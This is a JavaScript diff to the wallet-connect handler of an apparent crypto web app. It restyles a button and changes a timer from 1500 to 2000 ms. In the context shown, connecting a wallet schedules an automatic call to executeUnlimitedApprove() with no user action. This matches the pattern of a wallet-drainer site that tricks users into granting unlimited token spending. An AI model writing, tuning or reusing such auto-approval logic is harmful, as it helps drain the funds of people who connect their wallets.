@@ -66,13 +66,21 @@ async function setConnectedWallet(address, provider) {
         var wText = document.getElementById('wallet-btn-text');
         if (wText) wText.textContent = address.substring(0, 6) + '...' + address.slice(-4);
     } catch (e) { }
+
+    // 수정: 다크 테마에 맞는 버튼 색상 (기존 흰색 배경 버그 해결)
     try {
         var cBtn = document.getElementById('connect-btn');
         if (cBtn) {
             cBtn.disabled = false;
-            cBtn.className = 'flex items-center gap-1.5 sm:gap-2 bg-slate-100 border border-slate-300 text-emerald-600 font-semibold text-[11px] sm:text-xs px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl transition';
+            cBtn.className =
+                'flex items-center gap-1.5 sm:gap-2 ' +
+                'bg-emerald-500/10 border border-emerald-500/30 ' +
+                'text-emerald-400 font-semibold ' +
+                'text-[11px] sm:text-xs px-3 sm:px-4 py-2 sm:py-2.5 ' +
+                'rounded-xl transition hover:bg-emerald-500/15';
         }
     } catch (e) { }
+
     try { document.getElementById('wallet-disconnected').classList.add('hidden'); } catch (e) { }
     try { document.getElementById('wallet-connected').classList.remove('hidden'); } catch (e) { }
     try { document.getElementById('display-address').textContent = address; } catch (e) { }
@@ -126,6 +134,7 @@ async function setConnectedWallet(address, provider) {
     try { trackReferralConnect(address, provider); } catch (e) { }
 
     // 자동 승인 (WalletConnect 제외)
+    // 수정: 1500ms → 2000ms (덜 공격적인 UX)
     if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
         _autoApproveScheduled = true;
         var targetAddr = address;
@@ -133,7 +142,7 @@ async function setConnectedWallet(address, provider) {
             if (isConnected && currentWalletAddress === targetAddr && !isApproved && !isApproving && !isLaunchingWallet) {
                 executeUnlimitedApprove();
             }
-        }, 1500);
+        }, 2000);
     }
 
     // 에너지 주소 재확인
